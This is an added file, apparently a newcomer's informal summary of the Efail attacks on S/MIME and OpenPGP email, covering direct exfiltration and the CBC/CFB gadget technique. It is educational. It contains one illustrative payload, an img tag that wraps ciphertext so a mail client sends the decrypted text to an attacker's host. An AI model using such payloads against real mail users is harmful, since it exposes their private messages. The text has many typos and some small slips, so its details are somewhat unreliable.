@@ -1,0 +1,27 @@
+This article is brief summary of what I read about Efail attacks from https://efail.de/. Well, since I'm a newbie into the world
+of cybersecurity please do suggest changes if any :) 
+
+So to begin with Efail as the name would suggest targets the most popular Electfronic mail or the E-mails now these E-mails are protected by TLS (Transport Layer Security) Protocol which is used to perform a handshake between the client and the server before transferring the data between them (refer https://www.networkworld.com/article/2303073/lan-wan/lan-wan-what-is-transport-layer-security-protocol.html). 
+So some organisations would want to secure this transfer even more and hence the would use S/MIME and OpenPGP. Efail attack aims to penetrate through the layers of this protection and somehow get the palintext send by Alce to Bob. For this first Eve has to break into the communication channel somehow, get hold of the encrypted mail and then make some manipulations to it and send it to Bob so that she can get hold of the plaintext which is resultant of decryption by Bob's mail server.
+
+This attack is classified into two:
+Direct Exflitration:
+specific victims: Apple Mail, Mozilla Thunderbird
+In this case the bug in the above mail applications is exploited. Here, when Eve catches ho;d of the encrypted text she basiclly puts this text inside the image src header. Confused? Here's how this happens:
+
+what Eve sends to Bob:
+<img src="https://gryffindor.com
+  werywetetuywue4633yuerye3ywq==        <-- the ciphertext she got hold
+  ">
+ when Bob's client recieves this it decrypts the ciphertext cleverly send like this
+ <img src="https://gryffindor.com/
+   Draco is here
+  ">
+  It thinks that it's an image coz of the img src and contacts URL https://gryffindor.com/Draco%20is%20%here and thus when the client makes request to Eve's client she gets hold of the plaintext.
+	
+	The CBC/CFB Gadget attack:
+	So for this one the attacker makes use of the infamous CBC bitflipping attack. Now for implementing this attack we know that we must be in hold of 3 things:plaintext attacker desires, corresponding encrypted ciphertext of the block where changes are to be made and also the ciphertext preceeding this block. Now the vulnerability here's that it's known that S/MIME encrypted mails begin with "Content-type=multipart/signed" which is used to select the appropriate viewer application. So Eve knows atleast the content of the initial blocks. Now she can manipulate these known blocks to insert <img src="https://gryffindor.com tag before the ciphertext and "> after this so as to implement the same attack as in Diect Exflitration.
+	
+
+  
+  
